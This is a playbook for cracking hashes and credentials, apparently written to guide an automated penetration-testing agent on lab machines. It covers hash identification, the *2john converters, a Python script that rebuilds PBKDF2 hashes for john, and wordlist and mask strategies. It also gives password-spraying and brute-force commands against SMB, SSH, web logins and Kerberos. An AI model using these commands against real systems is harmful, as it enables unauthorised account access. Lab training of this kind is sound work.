# Hash and credential cracking

Cracking is a support activity, not a phase. Reach for it when you hold a hash
you cannot use directly — never as a substitute for finding the plaintext
somewhere on disk, which is faster and more reliable.

## Identify before you crack

```bash
pwnloop x "hashid '<hash>'"
pwnloop x "hashcat --identify '<hash>'"
```

Getting the format wrong wastes the whole run. Common shapes:

| prefix / shape | what it is | john format | hashcat mode |
|---|---|---|---|
| `$2y$` / `$2a$` | bcrypt | `bcrypt` | 3200 |
| `$6$` | sha512crypt (`/etc/shadow`) | `sha512crypt` | 1800 |
| `$1$` | md5crypt | `md5crypt` | 500 |
| `$y$` | yescrypt (modern shadow) | `crypt` | — |
| 32 hex | MD5 or NTLM — context decides | `raw-md5` / `nt` | 0 / 1000 |
| `$krb5asrep$23$` | AS-REP roast | `krb5asrep` | 18200 |
| `$krb5tgs$23$` | Kerberoast | `krb5tgs` | 13100 |
| `user::DOMAIN:...` | NetNTLMv2 | `netntlmv2` | 5600 |
| `$sshng$` | SSH private key | `ssh` | 22921 |
| `$office$` / `$zip2$` | Office / ZIP archive | `office` / `zip` | 9600 / 13600 |
| `$DCC2$` / `$mscash2` | domain cached creds | `mscash2` | 2100 |
| `$krb5pa$23$` | Kerberos preauth (etype 23) | `krb5pa-md5` | 7500 |
| `user:::hash:::` (NetNTLMv1) | NetNTLMv1 | `netntlm` | 5500 |
| `pbkdf2_sha256$` | Django | `django` | 10000 |
| `$pdf$` / `$racf$` | PDF / mainframe | `pdf` / `racf` | 10500 / 8500 |
| `$mysqlna$` / `*XXXX` | MySQL 4.1+ | `mysql-sha1` | 300 |
| 32 hex, no salt, uppercase | LM (legacy) | `lm` | 3000 |

## The `*2john` family

Anything with a password becomes a crackable hash first:

```bash
pwnloop x "ssh2john id_rsa      > k.hash"
pwnloop x "zip2john secret.zip  > z.hash"
pwnloop x "rar2john secret.rar  > r.hash"
pwnloop x "keepass2john db.kdbx > kp.hash"
pwnloop x "office2john doc.xlsx > o.hash"
pwnloop x "gpg2john key.asc     > g.hash"
pwnloop x "pdf2john file.pdf    > p.hash"
```

## Application hash stores: rebuild the format by hand, then prove it

Most application databases (a web app's `user` table, an exfiltrated SQLite/MySQL
dump) store a hash no `*2john` tool produces. Reconstruct john/hashcat's syntax
yourself from the app's own hashing code or docs — the parameters you need are
the KDF, the iteration count, the salt (usually a neighbouring column, raw ASCII)
and the output length.

Two things go wrong, and both look exactly like "the password isn't in the
wordlist":

- **Encoding.** John's PBKDF2 formats want the salt and digest in *adapted*
  base64 (standard alphabet, `+`→`.`, padding stripped), not hex.
- **Output length.** A format silently refuses lines whose digest length it does
  not support — john's `PBKDF2-HMAC-SHA256` loads only a **32-byte** digest, and
  a longer one produces `No password hashes loaded (see FAQ)` rather than an
  error naming the cause.

**A longer PBKDF2 digest can simply be truncated to what the cracker accepts.**
PBKDF2 derives output one HMAC block at a time and concatenates, so the first
32 bytes of a 50-byte derivation are bit-identical to a 32-byte derivation over
the same password/salt/iterations. Cut the hex and load it.

**Always validate the pipeline with a control hash before trusting a negative
result.** Derive a password *you choose* under the same parameters, add it to the
hash file, and crack it with a one-word wordlist. If the control does not fall,
your encoding is wrong — you have learned nothing about the real hash.

```bash
python3 - <<'EOF'
import base64, hashlib
ab64 = lambda b: base64.b64encode(b).rstrip(b'=').replace(b'+', b'.').decode()
j = lambda salt, dk: "$pbkdf2-sha256$%d$%s$%s" % (ITER, ab64(salt.encode()), ab64(dk))
# real hash: hex from the DB, truncated to the 32 bytes john will load
print("victim:" + j(SALT, bytes.fromhex(HEX[:64])))
# control: same parameters, password known to me
print("control:" + j(SALT, hashlib.pbkdf2_hmac("sha256", b"controlpw123", SALT.encode(), ITER, 32)))
EOF
john --format=PBKDF2-HMAC-SHA256 --wordlist=ctl.txt hashes   # control must crack
john --format=PBKDF2-HMAC-SHA256 --wordlist=rockyou.txt hashes
```

*(Example of the class: Grafana's `user` table stores PBKDF2-HMAC-SHA256,
10000 iterations, 50-byte digest as hex, with the per-user salt in the adjacent
`salt` column.)*

A sound KDF is not a strong password. A 10k-iteration PBKDF2 hash of a top-1 %
wordlist entry falls in well under a minute on CPU — so run the wordlist before
concluding an application's hashing "looks modern enough to skip".

## Running it

```bash
pwnloop x "john --format=<fmt> --wordlist=/usr/share/wordlists/rockyou.txt h.hash"
pwnloop x "john --show --format=<fmt> h.hash"
pwnloop x "hashcat -m <mode> -a 0 h.hash /usr/share/wordlists/rockyou.txt"
```

The container has no GPU, so hashcat runs on CPU. For anything slow (bcrypt,
sha512crypt) that is a reason to think harder rather than wait: on a lab box, a
hash that will not fall to rockyou in five minutes is usually not the intended
path.

## Strategy, in order

1. **rockyou straight.** Most lab passwords are in it. Five minutes, no rules.
2. **Rules on rockyou.** `--rules=best64` (john) or `-r rules/best64.rule`
   (hashcat) catches the `Password1!` shape.
3. **A targeted wordlist.** Words from the machine itself beat any generic list —
   company name, product names, usernames, strings from the web app:
   ```bash
   pwnloop x "cewl -d 3 -m 6 http://machine.htb -w /engagements/$NAME/loot/site.txt"
   pwnloop x "john --wordlist=/engagements/$NAME/loot/site.txt --rules=best64 h.hash"
   ```
4. **Mask attack**, when you know the shape (`Summer2024!`):
   ```bash
   pwnloop x "hashcat -m <mode> -a 3 h.hash '?u?l?l?l?l?l?d?d?d?d?s'"
   ```
5. **Stop.** Three failed strategies means the hash is not the way in. Go back
   to enumeration.

## Online attacks

Spraying is usually right; brute force usually is not. One password against
every user beats every password against one user, and it does not lock accounts
if you respect the policy.

```bash
pwnloop x "nxc smb $T -u users.txt -p 'Winter2025!' --continue-on-success"
pwnloop x "hydra -L users.txt -p 'Winter2025!' ssh://$T -t 4"
pwnloop x "hydra -l admin -P /usr/share/wordlists/rockyou.txt $T http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
```

Check the lockout policy first (`nxc smb $T -u u -p p --pass-pol`).

**When the policy is unreadable — which is the normal case before you hold any
credential — spray one password per account per window, not a list.** The
threshold on a hardened domain can be three. Kerberos reports a locked account as
`KDC_ERR_CLIENT_REVOKED`, the same code it uses for a disabled account, so you
only learn the limit by crossing it. And a locked account is unusable by the
*intended* path as well, so this turns a delay into a dead engagement until the
lockout window expires or the box is reset.

```bash
# acceptable without a policy: one candidate, all accounts, then stop and reassess
for u in $(cat users.txt); do
  pwnloop x "faketime \"\$FT\" impacket-getTGT dom.htb/$u:'OneCandidate1' -dc-ip $T" 2>&1 \
    | grep -E 'Saving ticket|KDC_ERR_'
done
```

Never brute force SSH as root on a lab box — it is not the intended path and it
is noisy enough to disrupt other users of a shared network.

## After a crack

Every recovered plaintext goes into the ledger's credential table and is then
tried against **every** service and **every** user on the box. Password reuse
resolves more lab machines than cracking itself does.
